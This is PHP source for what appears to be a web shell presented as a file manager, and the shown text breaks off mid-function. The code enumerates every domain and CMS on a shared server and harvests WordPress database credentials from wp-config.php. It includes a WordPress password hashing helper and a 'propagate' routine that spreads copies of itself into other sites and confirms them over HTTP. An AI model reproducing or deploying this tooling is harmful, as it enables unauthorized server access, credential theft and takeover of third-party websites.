<?php
if (function_exists('opcache_invalidate')) @opcache_invalidate(__FILE__, true);
if (!function_exists('password_verify')) {
    function password_verify($password, $hash) {
        return is_string($hash) && $hash !== '' && $password !== null && @crypt((string)$password, $hash) === $hash;
    }
}
$fmSessLifetime = 30 * 86400;
ini_set('session.gc_maxlifetime', (string)$fmSessLifetime);
@session_set_cookie_params($fmSessLifetime, '/', '', false, true);
session_start();
error_reporting(0);
ini_set('display_errors', '0');
ini_set('allow_url_include', '0');

define('FM_AUTH_HASH', '$2a$12$op01p2bGv4ZmQcghka2PfeXhpgHEvD/YNyqUdXwyYWCUtxZ11HPNy');
define('DOMAINS_JSON', __DIR__ . '/domains.json');
define('MAX_UPLOAD', 100 * 1024 * 1024);

function fm_rmdir($dir) {
    if (!is_dir($dir)) return 0;
    $cnt = 0;
    $stack = array($dir);
    while ($stack) {
        $d = array_pop($stack);
        $dh = @opendir($d);
        if (!$dh) continue;
        while (($e = readdir($dh)) !== false) {
            if ($e === '.' || $e === '..') continue;
            $fp = $d . '/' . $e;
            if (is_dir($fp)) { $stack[] = $fp; continue; }
            if (@unlink($fp)) $cnt++;
        }
        closedir($dh);
    }
    @rmdir($dir);
    return $cnt;
}

function fm_path($p) {
    $p = str_replace('\\', '/', $p);
    do { $p = preg_replace('#/\.\.(/|$)#', '/', $p, 1); } while (strpos($p, '..') !== false);
    return rtrim($p, '/');
}

function fm_protect($p) {
    $bad = ['/etc', '/sys', '/proc', '/bin', '/sbin', '/boot', '/dev', '/lib', '/mnt', '/opt', '/root', '/run', '/usr'];
    foreach ($bad as $b) {
        if (strpos($p, $b) === 0) { echo json_encode(['ok' => false, 'msg' => 'Access denied']); exit; }
    }
}

function detectRoot() {
    $self = dirname(__FILE__);
    $cwd = @getcwd() ?: '';
    $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
    $cands = array_merge([$self], $cwd ? [$cwd] : [], $docRoot ? [$docRoot] : []);
    foreach ($cands as $c) { $c = rtrim($c, '/'); if ($c && $c !== '/' && @is_dir($c) && is_readable($c)) return $c; }
    return $self ?: '.';
}

function resolvePath($p) {
    $p = fm_path($p);
    if (!$p) return detectRoot();
    if (@is_dir($p)) return $p;
    $root = detectRoot();
    $try = rtrim($root, '/') . '/' . ltrim($p, '/');
    if (@is_dir($try)) return $try;
    return $root;
}

function getFileIcon($name) {
    $base = strtolower(basename($name));
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    if (in_array($base, ['index.php', 'index.html', 'index.htm', 'default.php', 'default.html'])) {
        return ['fas fa-file-code', '#ef4444'];
    }
    $y = '#eab308';
    $icons = [
        'php' => ['fab fa-php', $y],
        'html' => ['fab fa-html5', $y],
        'htm' => ['fab fa-html5', $y],
        'css' => ['fab fa-css3-alt', $y],
        'js' => ['fab fa-js-square', $y],
        'ts' => ['fab fa-js-square', $y],
        'json' => ['fas fa-code', $y],
        'xml' => ['fas fa-code', $y],
        'sql' => ['fas fa-database', $y],
        'db' => ['fas fa-database', $y],
        'sqlite' => ['fas fa-database', $y],
        'py' => ['fab fa-python', $y],
        'rb' => ['fas fa-gem', $y],
        'go' => ['fas fa-code', $y],
        'java' => ['fab fa-java', $y],
        'c' => ['fas fa-code', $y],
        'cpp' => ['fas fa-code', $y],
        'h' => ['fas fa-code', $y],
        'sh' => ['fas fa-terminal', $y],
        'bash' => ['fas fa-terminal', $y],
        'bat' => ['fas fa-terminal', $y],
        'ps1' => ['fas fa-terminal', $y],
        'txt' => ['fas fa-file-alt', $y],
        'log' => ['fas fa-file-alt', $y],
        'md' => ['fab fa-markdown', $y],
        'csv' => ['fas fa-file-csv', $y],
        'xls' => ['fas fa-file-excel', $y],
        'xlsx' => ['fas fa-file-excel', $y],
        'doc' => ['fas fa-file-word', $y],
        'docx' => ['fas fa-file-word', $y],
        'pdf' => ['fas fa-file-pdf', $y],
        'zip' => ['fas fa-file-archive', $y],
        'rar' => ['fas fa-file-archive', $y],
        'tar' => ['fas fa-file-archive', $y],
        'gz' => ['fas fa-file-archive', $y],
        '7z' => ['fas fa-file-archive', $y],
        'jpg' => ['fas fa-file-image', $y],
        'jpeg' => ['fas fa-file-image', $y],
        'png' => ['fas fa-file-image', $y],
        'gif' => ['fas fa-file-image', $y],
        'svg' => ['fas fa-file-image', $y],
        'webp' => ['fas fa-file-image', $y],
        'ico' => ['fas fa-file-image', $y],
        'mp3' => ['fas fa-file-audio', $y],
        'wav' => ['fas fa-file-audio', $y],
        'mp4' => ['fas fa-file-video', $y],
        'avi' => ['fas fa-file-video', $y],
        'mov' => ['fas fa-file-video', $y],
        'mkv' => ['fas fa-file-video', $y],
        'ttf' => ['fas fa-font', $y],
        'otf' => ['fas fa-font', $y],
        'woff' => ['fas fa-font', $y],
        'woff2' => ['fas fa-font', $y],
        'yml' => ['fas fa-cog', $y],
        'yaml' => ['fas fa-cog', $y],
        'ini' => ['fas fa-cog', $y],
        'conf' => ['fas fa-cog', $y],
        'env' => ['fas fa-lock', $y],
        'htaccess' => ['fas fa-cog', $y],
    ];
    if (isset($icons[$ext])) return $icons[$ext];
    return ['fas fa-file', $y];
}

function isEditable($name) {
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $editable = ['php','html','htm','css','js','ts','json','xml','sql','py','rb','go','java','c','cpp','h','sh','bash','bat','ps1','txt','log','md','csv','yml','yaml','ini','conf','env','twig','blade.php','vue','jsx','tsx','scss','sass','less','htaccess','gitignore','dockerignore','dockerfile','makefile','cmake','txt','text','htpasswd','pass','passwd','cfg','config','php5','inc','module','install','info','po','pot','mo','lock','neon'];
    return in_array($ext, $editable) || strpos($name, '.') === 0;
}

function formatSize($bytes) {
    if ($bytes == 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), ($i > 1 ? 2 : 0)) . ' ' . $units[$i];
}

function formatDate($timestamp) {
    return date('d.m.Y H:i', $timestamp);
}

function fastCMS($root) {
    if (!is_dir($root)) return 'generic';
    if (@file_exists($root . '/wp-config.php') || @is_dir($root . '/wp-includes')) return 'wp';
    if (@file_exists($root . '/configuration.php') && @is_dir($root . '/administrator')) return 'joomla';
    if (@file_exists($root . '/bootstrap/app.php') || @file_exists($root . '/artisan') || @file_exists(dirname($root) . '/bootstrap/app.php') || @file_exists(dirname($root) . '/artisan')) return 'laravel';
    if (@is_dir($root . '/sites') && @is_dir($root . '/modules')) return 'drupal';
    if (@is_dir($root . '/app') && @is_dir($root . '/config') && @is_dir($root . '/public')) return 'laravel';
    if (@file_exists($root . '/sites/default/settings.php') || (@is_dir($root . '/sites') && @is_dir($root . '/modules'))) return 'drupal';
    return 'generic';
}

// --- Propagate security layer: we don't want the theme bug to happen again ---
function pr_path_safe($dp) {
    $dp = ltrim(str_replace('\\', '/', $dp), '/');
    $segs = explode('/', $dp);
    if (count($segs) < 2) return false;
    foreach ($segs as $si => $sg) { if ($sg === 'mu-plugins' && ($si === 0 || $segs[$si - 1] === 'wp-content')) return false; }
    $base = $segs[count($segs) - 1];
    $parent = $segs[count($segs) - 2];
    if ($parent === 'wp-content' && in_array($base, array('advanced-cache.php','object-cache.php','db.php','sunrise.php','db-error.php','maintenance.php','install.php','php-error.php','fatal-failure.php','error-log.php','blog-deploy.php'))) return false;
    if ($base === 'index.php' && in_array($parent, array('public','www','httpdocs','web','html'))) return false;
    return true;
}
function pr_is_foreign($target) {
    if (!@file_exists($target)) return false;
    $c = @file_get_contents($target);
    if ($c === false) return true;
    return stripos($c, 'FM_AUTH_HASH') === false;
}
function pr_verify_url($url) {
    if (!function_exists('curl_init')) return array(true, 0);
    $ch = curl_init($url);
    curl_setopt_array($ch, array(CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => 8, CURLOPT_CONNECTTIMEOUT => 4, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_HTTPHEADER => array('User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36')));
    $body = curl_exec($ch);
    $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    $ok = ($code === 200 && is_string($body) && stripos($body, 'FM_AUTH_HASH') !== false);
    return array($ok, $code);
}
function pr_verify_deploy_target($target, $proto, $domain, $dp) {
    $url = $proto . '://' . $domain . '/' . $dp;
    list($vok, $vcode) = pr_verify_url($url);
    if ($vok || $vcode !== 0) return array($vok, $url, $vcode);
    // HTTP 0: domain could not be resolved/connected. Try the file's web path via the real host.
    $doc = rtrim(isset($_SERVER['DOCUMENT_ROOT']) ? (string)$_SERVER['DOCUMENT_ROOT'] : '', '/\\');
    $host = isset($_SERVER['HTTP_HOST']) ? trim($_SERVER['HTTP_HOST']) : '';
    if ($doc !== '' && $host !== '' && stripos($target, $doc) === 0) {
        $rel = str_replace('\\', '/', ltrim(substr($target, strlen($doc)), '/\\'));
        if ($rel !== '') {
            $host = preg_replace('/:\d+$/', '', $host);
            $url2 = $proto . '://' . $host . '/' . $rel;
            list($vok2, $vcode2) = pr_verify_url($url2);
            return array($vok2, $url2, $vcode2);
        }
    }
    return array($vok, $url, $vcode);
}

function detectCMS($root) {
    if (!is_dir($root)) return null;
    $checks = [
        ['WordPress', 'fab fa-wordpress', '#21759b', [['wp-includes', 40], ['wp-config.php', 30], ['wp-content', 20]], 'wp-includes/version.php', '/\$\wp_version\s*=\s*[\'"]([^\'"]+)/'],
        ['Joomla', 'fab fa-joomla', '#F44321', [['administrator', 25], ['components', 25], ['modules', 20], ['configuration.php', 20]], 'libraries/joomla/version.php', '/\$VERSION\s*=\s*[\'"]([^\'"]+)/'],
        ['Laravel', 'fab fa-laravel', '#FF2D20', [['artisan', 35], ['composer.json', 25], ['app/Http', 20]], 'artisan', null],
        ['Drupal', 'fab fa-drupal', '#0678BE', [['sites/default', 30], ['modules', 20], ['core/includes', 20]], 'core/lib/Drupal.php', '/const\s+VERSION\s*=\s*[\'"]([^\'"]+)/'],
        ['Magento', 'fab fa-magento', '#EE672F', [['app/Mage.php', 30], ['app/code/core/Magento', 25], ['skin/frontend', 20]], 'app/Mage.php', '/const\s+VERSION\s*=\s*[\'"]([^\'"]+)/'],
        ['PrestaShop', 'fab fa-php', '#DF0067', [['classes/Cart.php', 30], ['config/config.inc.php', 25], ['modules', 20]], 'config/config.inc.php', '/prestashop_version.*[\'"]([^\'"]+)/'],
        ['OpenCart', 'fas fa-shopping-cart', '#2AC1BC', [['admin/controller/common/column_left.php', 30], ['catalog', 25], ['system', 20]], 'index.php', null],
        ['Ghost', 'fab fa-ghost', '#738A94', [['content/themes', 30], ['core/server', 25], ['config.production.json', 20]], 'package.json', '/"name":\s*"ghost"/'],
        ['Next.js', 'fas fa-play', '#000000', [['next.config', 40], ['pages', 20], ['.next', 20]], 'package.json', '/"next":\s*"/'],
        ['Nuxt.js', 'fas fa-play', '#00DC82', [['nuxt.config', 40], ['.nuxt', 20], ['pages', 15]], 'package.json', '/"nuxt":\s*"/'],
        ['Symfony', 'fas fa-code', '#000000', [['app/AppKernel.php', 30], ['web/app.php', 25], ['src/AppBundle', 20]], 'composer.json', '/"symfony\/framework"/'],
        ['CodeIgniter', 'fas fa-leaf', '#EF4223', [['system/core', 30], ['application', 25], ['index.php', 20]], 'system/core/CodeIgniter.php', '/CI_VERSION/'],
    ];
    $best = null;
    $bestScore = 0;
    foreach ($checks as $cms) {
        $score = 0;
        foreach ($cms[3] as $check) {
            $path = $root . '/' . $check[0];
            if (file_exists($path)) $score += $check[1];
        }
        if ($score > $bestScore) {
            $version = null;
            if (isset($cms[4]) && $cms[4] && file_exists($root . '/' . $cms[4])) {
                $content = @file_get_contents($root . '/' . $cms[4]);
                if ($content && isset($cms[5]) && preg_match($cms[5], $content, $m)) {
                    $version = $m[1];
                }
            }
            $bestScore = $score;
            $best = ['name' => $cms[0], 'icon' => $cms[1], 'color' => $cms[2], 'confidence' => min($score, 100), 'version' => $version];
        }
    }
    return $best;
}

function fm_isDomainName($n) {
    $n = strtolower($n);
    $n = preg_replace('/^www\./', '', $n);
    return (bool) preg_match('/^(?:[a-z0-9](?:[a-z0-9\-]*[a-z0-9])?\.)+[a-z]{2,}$/', $n);
}

function fm_permColor($perms) {
    $oct = substr(sprintf('%o', $perms), -4);
    $other = (int)$oct[3]; $group = (int)$oct[2]; $owner = (int)$oct[1];
    if ($other & 2) return '#ef4444';
    if ($group & 2) return '#f59e0b';
    if (($owner === 7 && $other === 5) || ($owner === 6 && $other === 4)) return '#22c55e';
    return 'var(--text-ter)';
}

function fmKnownHosts() {
    return array(
        'v2777003.hosted-by-vdsina.ru','193-38.hukot.cloud','ip-74-208-104-122.pbiaas.com','4180609-cg97178.twc1.net','internet-idea.ru',
        'ovh','61-219-82-146.hinet-ip.hinet.net','chunghwa','server200.e-eu.de','ecs-119-8-127-167.compute.hwclouds-dns.com',
        '185-20-224-59.cloudvps.regruhosting.ru','sh128.bul.net','parking.isp30.adminvps.net','web1.nyc3.tribetech.net',
        'euvds5045x10.startdedicated.de','117.176.205.92.host.secureserver.net','zhora1060.startdedicated.com','mail.aggreghiamoci.online',
        'web.bitneo.ch','89.248.198.169','selectel','vmi1511114.contaboserver.net','172-234-39-37.ip.linodeusercontent.com',
        '78-131-12-189.static.digikabel.hu','w26.goneo.de','ns567187.ip-51-79-98.net','admin.buhost.eu','acaweb.academy',
        'free.zbs.cloud','aiscbse.com','begel.fr','evanzo-server.de','cloudmax03.im-global.net','server01.zhugeserver.my.id',
        'teko.qqp.ch','vultrusercontent.com','clients.your-server.de','hetzner','leaseweb','contabo','vdsina','hukot',
        'twc1.net','hinet','linode','startdedicated','twc1.net'
    );
}

function fmKnownHostMatch($host) {
    $h = strtolower(trim((string)$host));
    if ($h === '' || $h === 'n/a' || $h === 'localhost') return false;
    foreach (fmKnownHosts() as $k) {
        $k = strtolower(trim($k));
        if ($k === '') continue;
        if ($h === $k) return true;
        if (strlen($k) >= 3 && strpos($h, $k) !== false) return true;
    }
    return false;
}

function fm_skipDummyDomain($n) {
    $n = fm_normDomain($n);
    if ($n === '' || $n === 'localhost' || $n === 'localhost.localdomain') return true;
    if (strpos($n, 'example.') !== false || substr($n, -13) === '.example.com' || substr($n, -12) === '.example.org') return true;
    $exact = array('domain.com','domain.org','domain.net','yourdomain.com','yourdomain.net','yourdomain.org','somedomain.com','mydomain.com','my-domain.com','test.com','test.org','test.net','site.com','mysite.com','my-site.com','website.com','newdomain.com','demo.com','demo.org','demo.net','your.site','domain.invalid','sanitized.invalid');
    return in_array($n, $exact, true);
}

function fm_normDomain($n) {
    $n = strtolower(trim($n));
    if (strpos($n, 'www.') === 0) $n = substr($n, 4);
    return $n;
}

function serverConfDomains() {
    $out = array();
    $patterns = array(
        array('path' => '/etc/nginx/sites-enabled', 're' => '/server_name\s+([^;]+);/i', 'root' => '/root\s+([^;]+);/i'),
        array('path' => '/etc/nginx/conf.d', 're' => '/server_name\s+([^;]+);/i', 'root' => '/root\s+([^;]+);/i'),
        array('path' => '/etc/nginx/sites-available', 're' => '/server_name\s+([^;]+);/i', 'root' => '/root\s+([^;]+);/i'),
        array('path' => '/etc/apache2/sites-available', 're' => '/ServerName\s+([^\s]+)/i', 'root' => '/DocumentRoot\s+([^\s]+)/i'),
        array('path' => '/etc/apache2/sites-enabled', 're' => '/ServerName\s+([^\s]+)/i', 'root' => '/DocumentRoot\s+([^\s]+)/i'),
        array('path' => '/etc/httpd/conf.d', 're' => '/ServerName\s+([^\s]+)/i', 'root' => '/DocumentRoot\s+([^\s]+)/i'),
        array('path' => '/etc/httpd/conf', 're' => '/ServerName\s+([^\s]+)/i', 'root' => '/DocumentRoot\s+([^\s]+)/i'),
        array('path' => '/usr/local/lsws/conf/vhosts', 're' => '/vhDomain\s+([^\s]+)/i', 'root' => '/docRoot\s+([^\s]+)/i'),
    );
    foreach ($patterns as $p) {
        if (!is_dir($p['path'])) continue;
        $dh = @opendir($p['path']);
        if (!$dh) continue;
        while (($fe = readdir($dh)) !== false) {
            if ($fe[0] === '.' || substr($fe, -5) !== '.conf') continue;
            $c = @file_get_contents($p['path'] . '/' . $fe);
            if (!$c) continue;
            if (preg_match_all($p['re'], $c, $m)) {
                foreach ($m[1] as $i => $dn) {
                    foreach (preg_split('/\s+/', trim($dn)) as $dname) {
                        $dname = trim($dname);
                        if (strpos($dname, '*.') === 0) $dname = substr($dname, 2);
                        if (!$dname || $dname === '_' || !fm_isDomainName($dname) || fm_skipDummyDomain($dname)) continue;
                        $dr = '';
                        if (isset($m[2][$i]) && $m[2][$i]) $dr = trim($m[2][$i]);
                        elseif (preg_match($p['root'], $c, $rm)) $dr = trim($rm[1]);
                        if (!$dr || strpos($dr, '$') !== false) $dr = '';
                        if ($dr && is_dir($dr)) $out[] = array('name' => $dname, 'root' => $dr);
                    }
                }
            }
        }
        closedir($dh);
    }
    $pleskVh = '/var/www/vhosts/system';
    if (is_dir($pleskVh)) {
        $dh = @opendir($pleskVh);
        if ($dh) { while (($fe = readdir($dh)) !== false) {
            if ($fe[0] === '.' || !is_dir($pleskVh . '/' . $fe)) continue;
            if (!fm_isDomainName($fe)) continue;
            $c = @file_get_contents($pleskVh . '/' . $fe . '/conf/nginx.conf');
            if (!$c) $c = @file_get_contents($pleskVh . '/' . $fe . '/conf/httpd.conf');
            if (!$c) continue;
            if (!preg_match('/server_name\s+([^;]+);/i', $c, $m)) continue;
            foreach (preg_split('/\s+/', trim($m[1])) as $dname) {
                $dname = trim($dname);
                if (!$dname || $dname === '_' || !fm_isDomainName($dname) || fm_skipDummyDomain($dname)) continue;
                $dr = '';
                if (preg_match('/root\s+([^;]+);/i', $c, $rm)) $dr = trim($rm[1]);
                if (!$dr || strpos($dr, '$') !== false) $dr = '';
                if ($dr && is_dir($dr)) $out[] = array('name' => $dname, 'root' => $dr);
            }
        } closedir($dh); }
    }
    return $out;
}

function fm_cacheFile($name) {
    $dir = function_exists('sys_get_temp_dir') ? sys_get_temp_dir() : '/tmp';
    return rtrim($dir, '/\\') . DIRECTORY_SEPARATOR . 'fm_' . $name . '_' . md5(__DIR__) . '.json';
}

function getDomains() {
    static $cache = null;
    if ($cache !== null) return $cache;
    $cacheFile = fm_cacheFile('domains');
    $cData = @file_get_contents($cacheFile);
    if ($cData) {
        $cj = @json_decode($cData, true);
        if (is_array($cj) && isset($cj['t']) && isset($cj['d']) && is_array($cj['d']) && (time() - (int)$cj['t']) < 60) {
            $cache = $cj['d'];
            return $cache;
        }
    }
    $domains = [];
    $seen = [];
    $addDomain = function($name, $root, $cms = null) use (&$domains, &$seen) {
        $key = fm_normDomain($name);
        if (!$key || isset($seen[$key])) return false;
        $exists = is_dir($root);
        $domains[] = ['name' => $name, 'root' => $root, 'exists' => $exists, 'writable' => $exists && is_writable($root), 'cms' => $cms !== null ? $cms : ($exists ? detectCMS($root) : null)];
        $seen[$key] = 1;
        return true;
    };
    $confDomains = serverConfDomains();
    foreach ($confDomains as $cd) {
        $addDomain($cd['name'], $cd['root']);
    }
    if (file_exists(DOMAINS_JSON)) {
        $data = json_decode(@file_get_contents(DOMAINS_JSON), true);
        if (is_array($data)) {
            foreach ($data as $d) {
                $name = isset($d['name']) ? $d['name'] : (isset($d['domain']) ? $d['domain'] : '');
                if (!$name || isset($seen[fm_normDomain($name)])) continue;
                $root = isset($d['root']) ? $d['root'] : (isset($d['path']) ? $d['path'] : '');
                if (!$root && $name) {
                    foreach(['/var/www/'.$name, '/home/'.$name.'/public_html'] as $c) { if(is_dir($c)) { $root=$c; break; } }
                }
                if (!$root) continue;
                $addDomain($name, $root);
            }
        }
    }
    $curHost = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '');
    $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
    $scriptDir = dirname(__FILE__);
    if ($curHost && !isset($seen[fm_normDomain($curHost)])) {
        $cr = $docRoot ?: (@getcwd() ?: $scriptDir);
        if ($cr && is_dir($cr)) {
            $addDomain($curHost, $cr);
        }
    }
    if ($docRoot && is_dir($docRoot)) {
        $parentDir = dirname($docRoot);
        if ($parentDir !== $docRoot && is_dir($parentDir)) {
            $dh = @opendir($parentDir);
            if ($dh) { while (($e = readdir($dh)) !== false) {
                if ($e[0] === '.' || isset($seen[fm_normDomain($e)]) || !fm_isDomainName($e)) continue;
                $fp = $parentDir . '/' . $e;
                if (!is_dir($fp)) continue;
                $addDomain($e, $fp);
            } closedir($dh); }
        }
    }
    $scanDirs = ['/var/www', '/var/www/vhosts', '/var/www/domains', '/home', '/srv/www', '/srv/http', '/usr/share/nginx/html'];
    foreach ($scanDirs as $sd) {
        if (!is_dir($sd)) continue;
        $dh = @opendir($sd);
        if (!$dh) continue;
        while (($e = readdir($dh)) !== false) {
            if ($e[0] === '.' || isset($seen[fm_normDomain($e)])) continue;
            $fp = $sd . '/' . $e;
            if (!is_dir($fp)) continue;
            if (preg_match('/^\/home\/([^\/]+)$/', $fp, $um)) {
                $ud = $fp . '/domains';
                if (is_dir($ud)) {
                    $udd = @opendir($ud);
                    if ($udd) { while (($du = readdir($udd)) !== false) {
                        if ($du[0] === '.' || isset($seen[fm_normDomain($du)])) continue;
                        foreach (['public_html', 'www', 'httpdocs', 'htdocs', 'web', ''] as $sub) {
                            $dp = $sub ? $ud . '/' . $du . '/' . $sub : $ud . '/' . $du;
                            if (is_dir($dp) && fm_isDomainName($du)) { $addDomain($du, $dp); break; }
                        }
                    } closedir($udd); }
                }
                $uw = $fp . '/web';
                if (is_dir($uw)) {
                    $uwd = @opendir($uw);
                    if ($uwd) { while (($du = readdir($uwd)) !== false) {
                        if ($du[0] === '.' || isset($seen[fm_normDomain($du)])) continue;
                        foreach (['public_html', 'www', 'httpdocs', 'htdocs', 'web', ''] as $sub) {
                            $dp = $sub ? $uw . '/' . $du . '/' . $sub : $uw . '/' . $du;
                            if (is_dir($dp) && fm_isDomainName($du)) { $addDomain($du, $dp); break; }
                        }
                    } closedir($uwd); }
                }
                if (!isset($seen[fm_normDomain($e)])) {
                    foreach (array('public_html', 'httpdocs', 'www', 'htdocs', 'web', 'html', 'site') as $ws) {
                        $up = $fp . '/' . $ws;
                        if (!is_dir($up)) continue;
                        $nm = $e;
                        $cc = @file_get_contents($up . '/wp-config.php');
                        if ($cc && preg_match("/define\s*\(\s*['\"]WP_SITEURL['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $cc, $m)) {
                            preg_match('#^https?://([^/]+)#i', trim($m[1]), $hm);
                            if (!empty($hm[1])) $nm = preg_replace('/^www\./', '', trim($hm[1]));
                        } else {
                            $cc = @file_get_contents($up . '/configuration.php');
                            if ($cc && preg_match("/\\\$live_site\s*=\s*['\"]([^'\"]*)['\"]/", $cc, $m) && trim($m[1])) {
                                $h = @parse_url(trim($m[1]), PHP_URL_HOST);
                                if ($h) $nm = preg_replace('/^www\./', '', trim($h));
                            }
                        }
                        $addDomain($nm, $up);
                        break;
                    }
                }
                continue;
            }
            foreach (['public_html', 'www', 'httpdocs', 'htdocs', 'web', 'webroot', 'html', 'html_public', 'site', 'raiz', 'document_root', ''] as $sub) {
                $dp = $sub ? $fp . '/' . $sub : $fp;
                if (is_dir($dp) && !isset($seen[fm_normDomain($e)]) && fm_isDomainName($e)) {
                    $addDomain($e, $dp);
                    break;
                }
            }
        }
        closedir($dh);
    }
    $cache = $domains;
    @file_put_contents($cacheFile, json_encode(array('t' => time(), 'd' => $domains)));
    return $domains;
}
function jmFindDomains() {
    $res = array();
    $seenJ = array();
    foreach (getDomains() as $d) {
        $r = $d['root'];
        if (!$r || !is_dir($r)) continue;
        if (isset($seenJ[$r])) continue;
        $seenJ[$r] = 1;
        if (@is_file($r . '/configuration.php') && @is_dir($r . '/administrator')) {
            $res[] = array('name' => $d['name'], 'root' => $r, 'writable' => is_writable($r));
        }
    }
    return $res;
}

function cmsAdminUrl($root, $cmsName) {
    $paths = array(
        'WordPress'  => array('wp-admin', 'administrator'),
        'Joomla'     => array('administrator'),
        'Drupal'     => array('admin'),
        'Magento'    => array('admin'),
        'PrestaShop' => array('admin123', 'back-office', 'administration', 'admin'),
        'OpenCart'   => array('admin'),
        'Laravel'    => array('admin', 'dashboard', 'panel'),
        'Symfony'    => array('admin'),
        'CodeIgniter'=> array('admin'),
        'Ghost'      => array('ghost'),
    );
    $dirs = array();
    $cand = isset($paths[$cmsName]) ? $paths[$cmsName] : array();
    foreach ($cand as $p) {
        if (is_dir($root . '/' . $p)) $dirs[] = $p;
    }
    $opt = array();
    $urlBase = '';
    if ($cmsName === 'WordPress' && is_file($root . '/wp-config.php')) {
        $cfgC = @file_get_contents($root . '/wp-config.php');
        if (preg_match("/define\s*\(\s*['\"]WP_SITEURL['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $cfgC, $m)) { $opt['siteurl'] = $m[1]; $urlBase = $m[1]; }
        if (preg_match("/define\s*\(\s*['\"]WP_HOME['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $cfgC, $m)) { $opt['home'] = $m[1]; if (!$urlBase) $urlBase = $m[1]; }
        if (preg_match("/\$\s*table_prefix\s*=\s*['\"]?([^';\"]+)/", $cfgC, $m)) $opt['prefix'] = trim($m[1], "'\"");
    }
    if ($cmsName === 'Joomla' && is_file($root . '/configuration.php')) {
        $cfgC = @file_get_contents($root . '/configuration.php');
        if (preg_match("/\\\$live_site\s*=\s*['\"]([^'\"]*)['\"]/", $cfgC, $m)) {
            $opt['live_site'] = $m[1];
            if ($m[1]) $urlBase = rtrim($m[1], '/');
        }
        if (preg_match("/\\\$log_path|\\\$mailfrom/", $cfgC)) $opt['cfg'] = 1;
    }
    $path = $dirs ? $dirs[0] : null;
    return array('path' => $path, 'dirs' => $dirs, 'opt' => $opt, 'base' => $urlBase);
}

function findWpConfig($path = null) {
    $start = $path ?: dirname(__FILE__);
    $paths = array_unique(array_filter(array($start, @getcwd(), isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '')));
    foreach ($paths as $base) {
        if (!$base) continue;
        $p = rtrim($base, '/');
        for ($i = 0; $i < 15; $i++) {
            if (@is_file($p . '/wp-config.php')) return $p . '/wp-config.php';
            $parent = dirname($p);
            if ($parent === $p || $parent === '/') break;
            $p = $parent;
        }
    }
    return null;
}

function wpConnect() {
    if (!class_exists('mysqli', false)) return null;
    $cfg = findWpConfig();
    if (!$cfg) return null;
    $defs = ['DB_NAME','DB_USER','DB_PASSWORD','DB_HOST'];
    $vals = [];
    $content = @file_get_contents($cfg);
    foreach ($defs as $d) {
        if (preg_match("/define\s*\(\s*['\"]" . $d . "['\"]\s*,\s*['\"](.+?)['\"]/", $content, $m)) {
            $vals[$d] = $m[1];
        } else { return null; }
    }
    preg_match("/table_prefix\s*=\s*['\"]?([^'\";\s]+)/", $content, $tpm);
    $tp = isset($tpm[1]) ? $tpm[1] : 'wp_';
    $mysqli = @new mysqli($vals['DB_HOST'], $vals['DB_USER'], $vals['DB_PASSWORD'], $vals['DB_NAME']);
    if ($mysqli->connect_errno) return null;
    $mysqli->set_charset('utf8');
    return ['mysqli' => $mysqli, 'prefix' => $tp, 'config' => $cfg];
}

function wpHashPass($password) {
    if (function_exists('wp_hash_password')) return wp_hash_password($password);
    $cfg = findWpConfig();
    if ($cfg) {
        $wpRoot = dirname($cfg);
        $phass = $wpRoot . '/wp-includes/class-phpass.php';
        if (file_exists($phass)) { require_once $phass; $h = new PasswordHash(8, true); return $h->HashPassword($password); }
    }
    return password_hash($password, PASSWORD_BCRYPT);
}

function getSystemInfo() {
    $cacheFile = fm_cacheFile('sysinfo');
    $cData = @file_get_contents($cacheFile);
    if ($cData) {
        $cj = @json_decode($cData, true);
        if (is_array($cj) && isset($cj['t']) && isset($cj['d']) && is_array($cj['d']) && (time() - (int)$cj['t']) < 180 && !empty($cj['d']['hostname'])) {
            return $cj['d'];
        }
    }
    $info = [];
    $info['php_version'] = PHP_VERSION;
    $curlVer = function_exists('curl_version') ? curl_version() : null;
    $info['curl_version'] = $curlVer ? $curlVer['version'] : 'N/A';
    $info['server_software'] = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown';
    $info['server_name'] = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : (gethostname() ?: 'N/A');
    $info['server_ip'] = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '127.0.0.1';
    if (in_array($info['server_ip'], array('127.0.0.1', '0.0.0.0', '::1'))) {
        $hst = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '');
        $hst = preg_replace('/:\d+$/', '', trim($hst));
        if ($hst) {
            $res = @gethostbyname($hst);
            if ($res && $res !== $hst && filter_var($res, FILTER_VALIDATE_IP)) $info['server_ip'] = $res;
        }
    }
    $hnCand = array();
    if (function_exists('gethostname')) { $v = @gethostname(); if ($v) $hnCand[] = (string)$v; }
    if (function_exists('php_uname')) { $v = @php_uname('n'); if ($v) $hnCand[] = (string)$v; }
    if (function_exists('getenv')) {
        foreach (array('HOSTNAME', 'HOST', 'SERVER_NAME') as $hnE) { $v = @getenv($hnE); if ($v) $hnCand[] = (string)$v; }
    }
    $hnF = @file_get_contents('/proc/sys/kernel/hostname');
    if ($hnF !== false) { $v = trim($hnF); if ($v) $hnCand[] = $v; }
